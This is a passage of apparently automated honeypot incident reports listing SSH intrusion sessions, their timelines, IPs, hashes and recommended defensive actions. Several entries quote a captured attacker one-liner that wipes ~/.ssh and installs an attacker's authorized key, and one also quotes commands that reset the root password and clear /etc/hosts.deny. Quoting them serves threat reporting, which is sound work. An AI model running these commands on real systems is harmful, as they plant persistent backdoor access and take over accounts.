| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:13:13` | `cowrie.session.connect` |
| `2026-04-19 11:13:13` | `cowrie.client.version` |
| `2026-04-19 11:13:13` | `cowrie.client.kex` |
| `2026-04-19 11:13:13` | `cowrie.login.success` |
| `2026-04-19 11:13:14` | `cowrie.session.params` |
| `2026-04-19 11:13:14` | `cowrie.command.input` |
| `2026-04-19 11:13:14` | `cowrie.command.failed` |
| `2026-04-19 11:13:14` | `cowrie.log.closed` |
| `2026-04-19 11:13:14` | `cowrie.session.params` |
| `2026-04-19 11:13:14` | `cowrie.command.input` |
| `2026-04-19 11:13:14` | `cowrie.session.file_download` |
| `2026-04-19 11:13:14` | `cowrie.log.closed` |
| `2026-04-19 11:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5def55afa3cf

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-19 11:13 |
| **Last Seen** | 2026-04-19 11:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:13:16` | `cowrie.session.connect` |
| `2026-04-19 11:13:16` | `cowrie.client.version` |
| `2026-04-19 11:13:16` | `cowrie.client.kex` |
| `2026-04-19 11:13:17` | `cowrie.login.success` |
| `2026-04-19 11:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e344e6d9ebc2

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-19 11:16 |
| **Last Seen** | 2026-04-19 11:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:16:21` | `cowrie.session.connect` |
| `2026-04-19 11:16:21` | `cowrie.client.version` |
| `2026-04-19 11:16:22` | `cowrie.client.kex` |
| `2026-04-19 11:16:22` | `cowrie.login.success` |
| `2026-04-19 11:16:23` | `cowrie.session.params` |
| `2026-04-19 11:16:23` | `cowrie.command.input` |
| `2026-04-19 11:16:23` | `cowrie.command.failed` |
| `2026-04-19 11:16:23` | `cowrie.log.closed` |
| `2026-04-19 11:16:23` | `cowrie.session.params` |
| `2026-04-19 11:16:23` | `cowrie.command.input` |
| `2026-04-19 11:16:23` | `cowrie.session.file_download` |
| `2026-04-19 11:16:23` | `cowrie.log.closed` |
| `2026-04-19 11:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9017c6490d7

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-19 11:16 |
| **Last Seen** | 2026-04-19 11:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:16:25` | `cowrie.session.connect` |
| `2026-04-19 11:16:25` | `cowrie.client.version` |
| `2026-04-19 11:16:25` | `cowrie.client.kex` |
| `2026-04-19 11:16:26` | `cowrie.login.success` |
| `2026-04-19 11:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e5000c45890

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 11:17 |
| **Last Seen** | 2026-04-19 11:17 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:17:43` | `cowrie.session.connect` |
| `2026-04-19 11:17:43` | `cowrie.client.version` |
| `2026-04-19 11:17:44` | `cowrie.client.kex` |
| `2026-04-19 11:17:44` | `cowrie.login.success` |
| `2026-04-19 11:17:45` | `cowrie.session.params` |
| `2026-04-19 11:17:45` | `cowrie.command.input` |
| `2026-04-19 11:17:45` | `cowrie.command.failed` |
| `2026-04-19 11:17:45` | `cowrie.log.closed` |
| `2026-04-19 11:17:45` | `cowrie.session.params` |
| `2026-04-19 11:17:45` | `cowrie.command.input` |
| `2026-04-19 11:17:45` | `cowrie.session.file_download` |
| `2026-04-19 11:17:45` | `cowrie.log.closed` |
| `2026-04-19 11:17:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c72de3b85a8d

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 11:17 |
| **Last Seen** | 2026-04-19 11:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:17:55` | `cowrie.session.connect` |
| `2026-04-19 11:17:55` | `cowrie.client.version` |
| `2026-04-19 11:17:55` | `cowrie.client.kex` |
| `2026-04-19 11:17:56` | `cowrie.login.success` |
| `2026-04-19 11:17:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bc06a000f18

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 11:22 |
| **Last Seen** | 2026-04-19 11:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:22:13` | `cowrie.session.connect` |
| `2026-04-19 11:22:13` | `cowrie.client.version` |
| `2026-04-19 11:22:13` | `cowrie.client.kex` |
| `2026-04-19 11:22:14` | `cowrie.login.success` |
| `2026-04-19 11:22:14` | `cowrie.session.params` |
| `2026-04-19 11:22:14` | `cowrie.command.input` |
| `2026-04-19 11:22:14` | `cowrie.command.failed` |
| `2026-04-19 11:22:14` | `cowrie.log.closed` |
| `2026-04-19 11:22:15` | `cowrie.session.params` |
| `2026-04-19 11:22:15` | `cowrie.command.input` |
| `2026-04-19 11:22:15` | `cowrie.session.file_download` |
| `2026-04-19 11:22:15` | `cowrie.log.closed` |
| `2026-04-19 11:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8072242f1b16

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 11:22 |
| **Last Seen** | 2026-04-19 11:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:22:17` | `cowrie.session.connect` |
| `2026-04-19 11:22:17` | `cowrie.client.version` |
| `2026-04-19 11:22:17` | `cowrie.client.kex` |
| `2026-04-19 11:22:18` | `cowrie.login.success` |
| `2026-04-19 11:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63ae1d8b1ddb

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 11:24 |
| **Last Seen** | 2026-04-19 11:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:24:24` | `cowrie.session.connect` |
| `2026-04-19 11:24:24` | `cowrie.client.version` |
| `2026-04-19 11:24:25` | `cowrie.client.kex` |
| `2026-04-19 11:24:26` | `cowrie.login.success` |
| `2026-04-19 11:24:26` | `cowrie.session.params` |
| `2026-04-19 11:24:26` | `cowrie.command.input` |
| `2026-04-19 11:24:26` | `cowrie.command.failed` |
| `2026-04-19 11:24:26` | `cowrie.log.closed` |
| `2026-04-19 11:24:27` | `cowrie.session.params` |
| `2026-04-19 11:24:27` | `cowrie.command.input` |
| `2026-04-19 11:24:27` | `cowrie.session.file_download` |
| `2026-04-19 11:24:27` | `cowrie.log.closed` |
| `2026-04-19 11:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-164b988a8282

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 11:24 |
| **Last Seen** | 2026-04-19 11:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:24:30` | `cowrie.session.connect` |
| `2026-04-19 11:24:30` | `cowrie.client.version` |
| `2026-04-19 11:24:31` | `cowrie.client.kex` |
| `2026-04-19 11:24:31` | `cowrie.login.success` |
| `2026-04-19 11:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ef028a9fa9

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 11:28 |
| **Last Seen** | 2026-04-19 11:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:28:49` | `cowrie.session.connect` |
| `2026-04-19 11:28:49` | `cowrie.client.version` |
| `2026-04-19 11:28:49` | `cowrie.client.kex` |
| `2026-04-19 11:28:50` | `cowrie.login.success` |
| `2026-04-19 11:28:50` | `cowrie.session.params` |
| `2026-04-19 11:28:50` | `cowrie.command.input` |
| `2026-04-19 11:28:50` | `cowrie.command.failed` |
| `2026-04-19 11:28:50` | `cowrie.log.closed` |
| `2026-04-19 11:28:51` | `cowrie.session.params` |
| `2026-04-19 11:28:51` | `cowrie.command.input` |
| `2026-04-19 11:28:51` | `cowrie.session.file_download` |
| `2026-04-19 11:28:51` | `cowrie.log.closed` |
| `2026-04-19 11:28:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7762fcd1aa34

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 11:28 |
| **Last Seen** | 2026-04-19 11:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:28:54` | `cowrie.session.connect` |
| `2026-04-19 11:28:54` | `cowrie.client.version` |
| `2026-04-19 11:28:54` | `cowrie.client.kex` |
| `2026-04-19 11:28:55` | `cowrie.login.success` |
| `2026-04-19 11:28:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52d860739708

| Field | Detail |
|---|---|
| **Source IP** | `180.76.115[.]202` |
| **First Seen** | 2026-04-19 12:28 |
| **Last Seen** | 2026-04-19 12:29 |
| **Session Duration** | 53s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ubMR8kdN5z6a"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 12:28:10` | `cowrie.session.connect` |
| `2026-04-19 12:28:10` | `cowrie.client.version` |
| `2026-04-19 12:28:10` | `cowrie.client.kex` |
| `2026-04-19 12:28:16` | `cowrie.login.success` |
| `2026-04-19 12:28:17` | `cowrie.session.params` |
| `2026-04-19 12:28:17` | `cowrie.command.input` |
| `2026-04-19 12:28:17` | `cowrie.command.failed` |
| `2026-04-19 12:28:17` | `cowrie.log.closed` |
| `2026-04-19 12:28:18` | `cowrie.session.params` |
| `2026-04-19 12:28:18` | `cowrie.command.input` |
| `2026-04-19 12:28:18` | `cowrie.session.file_download` |
| `2026-04-19 12:28:18` | `cowrie.log.closed` |
| `2026-04-19 12:28:33` | `cowrie.session.params` |
| `2026-04-19 12:28:33` | `cowrie.command.input` |
| `2026-04-19 12:28:33` | `cowrie.log.closed` |
| `2026-04-19 12:28:36` | `cowrie.session.params` |
| `2026-04-19 12:28:36` | `cowrie.command.input` |
| `2026-04-19 12:28:36` | `cowrie.log.closed` |
| `2026-04-19 12:28:37` | `cowrie.session.params` |
| `2026-04-19 12:28:37` | `cowrie.command.input` |
| `2026-04-19 12:28:37` | `cowrie.session.file_download` |
| `2026-04-19 12:28:37` | `cowrie.log.closed` |
| `2026-04-19 12:28:37` | `cowrie.session.params` |
| `2026-04-19 12:28:37` | `cowrie.command.input` |
| `2026-04-19 12:28:38` | `cowrie.log.closed` |
| `2026-04-19 12:28:40` | `cowrie.session.params` |
| `2026-04-19 12:28:40` | `cowrie.command.input` |
| `2026-04-19 12:28:41` | `cowrie.log.closed` |
| `2026-04-19 12:28:42` | `cowrie.session.params` |
| `2026-04-19 12:28:42` | `cowrie.command.input` |
| `2026-04-19 12:28:42` | `cowrie.command.input` |
| `2026-04-19 12:28:42` | `cowrie.log.closed` |
| `2026-04-19 12:28:43` | `cowrie.session.params` |
| `2026-04-19 12:28:43` | `cowrie.command.input` |
| `2026-04-19 12:28:43` | `cowrie.log.closed` |
| `2026-04-19 12:28:44` | `cowrie.session.params` |
| `2026-04-19 12:28:44` | `cowrie.command.input` |
| `2026-04-19 12:28:44` | `cowrie.log.closed` |
| `2026-04-19 12:28:46` | `cowrie.session.params` |
| `2026-04-19 12:28:46` | `cowrie.command.input` |
| `2026-04-19 12:28:47` | `cowrie.log.closed` |
| `2026-04-19 12:28:48` | `cowrie.session.params` |
| `2026-04-19 12:28:48` | `cowrie.command.input` |
| `2026-04-19 12:28:48` | `cowrie.log.closed` |
| `2026-04-19 12:28:50` | `cowrie.session.params` |
| `2026-04-19 12:28:50` | `cowrie.command.input` |
| `2026-04-19 12:28:51` | `cowrie.log.closed` |
| `2026-04-19 12:28:51` | `cowrie.session.params` |
| `2026-04-19 12:28:51` | `cowrie.command.input` |
| `2026-04-19 12:28:53` | `cowrie.log.closed` |
| `2026-04-19 12:28:56` | `cowrie.session.params` |
| `2026-04-19 12:28:56` | `cowrie.command.input` |
| `2026-04-19 12:28:57` | `cowrie.log.closed` |
| `2026-04-19 12:28:59` | `cowrie.session.params` |
| `2026-04-19 12:28:59` | `cowrie.command.input` |
| `2026-04-19 12:29:01` | `cowrie.log.closed` |
| `2026-04-19 12:29:01` | `cowrie.session.params` |
| `2026-04-19 12:29:01` | `cowrie.command.input` |
| `2026-04-19 12:29:02` | `cowrie.log.closed` |
| `2026-04-19 12:29:02` | `cowrie.session.params` |
| `2026-04-19 12:29:02` | `cowrie.command.input` |
| `2026-04-19 12:29:03` | `cowrie.log.closed` |
| `2026-04-19 12:29:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.115[.]202` to AbuseIPDB if not already reported
- [ ] Block `180.76.115[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dbcc656be37

| Field | Detail |
|---|---|
| **Source IP** | `14.103.108[.]102` |
| **First Seen** | 2026-04-19 12:33 |
| **Last Seen** | 2026-04-19 12:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 12:33:18` | `cowrie.session.connect` |
| `2026-04-19 12:33:18` | `cowrie.client.version` |
| `2026-04-19 12:33:18` | `cowrie.client.kex` |
| `2026-04-19 12:33:19` | `cowrie.login.success` |
| `2026-04-19 12:33:20` | `cowrie.session.params` |
| `2026-04-19 12:33:20` | `cowrie.command.input` |
| `2026-04-19 12:33:20` | `cowrie.command.failed` |
| `2026-04-19 12:33:20` | `cowrie.log.closed` |
| `2026-04-19 12:33:21` | `cowrie.session.params` |
| `2026-04-19 12:33:21` | `cowrie.command.input` |
| `2026-04-19 12:33:21` | `cowrie.session.file_download` |
| `2026-04-19 12:33:21` | `cowrie.log.closed` |
| `2026-04-19 12:33:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.108[.]102` to AbuseIPDB if not already reported
- [ ] Block `14.103.108[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-011b9671383a

| Field | Detail |
|---|---|
| **Source IP** | `14.103.108[.]102` |
| **First Seen** | 2026-04-19 12:33 |
| **Last Seen** | 2026-04-19 12:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
